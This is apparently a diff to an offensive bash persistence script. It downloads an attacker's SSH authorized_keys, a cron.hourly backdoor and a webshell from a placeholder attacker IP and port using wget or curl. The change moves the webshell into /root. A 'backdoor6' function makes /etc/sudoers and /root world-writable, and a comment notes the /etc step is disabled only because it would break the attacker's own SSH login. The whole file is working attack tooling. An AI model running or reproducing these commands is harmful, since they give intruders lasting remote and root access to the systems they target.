@@ -31,7 +31,7 @@ main()
 		printf "Using WGET to transfer files\n"
 		$wget_location http://$attacker_ip:$attacker_port/authorized_keys -q -O $hidden_authorized_keys
 		$wget_location http://$attacker_ip:$attacker_port/backdoor -q -O /etc/cron.hourly/$backdoor_name > /dev/null
-		$wget_location http://$attacker_ip:$attacker_port/webshell -q -O /tmp/$webshell > /dev/null
+		$wget_location http://$attacker_ip:$attacker_port/webshell -q -O /root/$webshell > /dev/null
 			getrekt
 	elif [[ -f $curl_location ]]
 	then 
@@ -39,7 +39,7 @@ main()
 		printf "Using CURL to transfer files"
 		$curl_location http://$attacker_ip:$attacker_port/authorized_keys > $hidden_authorized_keys 
 		$curl_location http://$attacker_ip:$attacker_port/backdoor > /etc/cron.hourly/$backdoor_name
-		$curl_location http://$attacker_ip:$attacker_port/webshell > /tmp/$webshell
+		$curl_location http://$attacker_ip:$attacker_port/webshell > /root/$webshell
 		getrekt
 	else
 		printf "Error: wget and curl not found. Exiting"
@@ -183,8 +183,10 @@ backdoor6() {
 	if chmod -f 777 /etc/sudoers ; then printf "/etc/sudoers is now world writeable\n"; fi
 	chmod -Rf 777 /root 
 	printf "/root/* is world writeable\n"
-	chmod -Rf 777 /etc
-	printf "/etc/* is world writeable\n"
+	
+	#disabling for now. if we store our ssh key in /etc/ nobody can log in due to lax permissions
+	#chmod -Rf 777 /etc
+	#printf "/etc/* is world writeable\n"
 }
 
 doublegetrekt() {
